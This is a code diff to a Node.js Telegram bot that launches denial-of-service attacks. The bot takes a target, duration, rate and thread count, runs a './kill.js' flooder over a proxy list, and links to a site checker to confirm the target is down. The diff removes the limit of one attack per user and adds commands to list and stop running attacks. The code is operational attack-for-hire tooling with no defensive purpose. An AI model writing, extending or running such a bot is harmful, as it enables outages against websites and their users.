@@ -55,11 +55,6 @@ bot.on('message', (msg) => {
       return
     }
 
-    if (activeAttacks[userId]) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "You are attacking another website, please wait!" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-      return
-    }
-
     const [target, timeStr, rate, thread] = args
     const time = parseInt(timeStr)
 
@@ -73,45 +68,77 @@ bot.on('message', (msg) => {
       return
     }
 
-    try {
-      activeAttacks[userId] = true
-      const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
-      const response = {
-        status: "Attack Started!",
-        target,
-        time,
-        rate,
-        thread,
-        caller: username
-      }
+    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
+    const attackId = `${userId}_${Date.now()}`
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId }
 
-      bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: 'Check Website 🔍',
-                url: `https://check-host.net/check-http?host=${target}`
-              }
-            ]
-          ]
-        }
-      })
-
-      cmd.on('error', (err) => {
-        delete activeAttacks[userId]
-        bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-      })
-
-      cmd.on('close', (code) => {
-        delete activeAttacks[userId]
-        bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code, target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-      })
-    } catch (err) {
-      delete activeAttacks[userId]
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    const response = {
+      status: "Attack Started!",
+      target,
+      time,
+      rate,
+      thread,
+      caller: username,
+      index: attackId
     }
+
+    bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: 'Check Website 🔍',
+              url: `https://check-host.net/check-http?host=${target}`
+            }
+          ]
+        ]
+      }
+    })
+
+    cmd.on('error', (err) => {
+      delete activeAttacks[attackId]
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    })
+
+    cmd.on('close', (code) => {
+      delete activeAttacks[attackId]
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code, target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    })
+  }
+
+  if (text === '/list') {
+    const list = Object.entries(activeAttacks)
+      .filter(([_, v]) => isAdmin || v.userId === userId)
+      .map(([key, v], i) => ({
+        index: key,
+        target: v.target,
+        time: v.time,
+        rate: v.rate,
+        thread: v.thread
+      }))
+    bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
+  }
+
+  if (text.startsWith('/stop')) {
+    const args = text.split(/\s+/).slice(1)
+    if (args.length !== 1) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/stop <index>" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    const key = args[0]
+    const attack = activeAttacks[key]
+    if (!attack) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Not found" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    if (!isAdmin && attack.userId !== userId) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Permission denied" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    attack.cmd.kill()
+    delete activeAttacks[key]
+    bot.sendMessage(id, '```json\n' + JSON.stringify({ stopped: true, target: attack.target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
 })
 
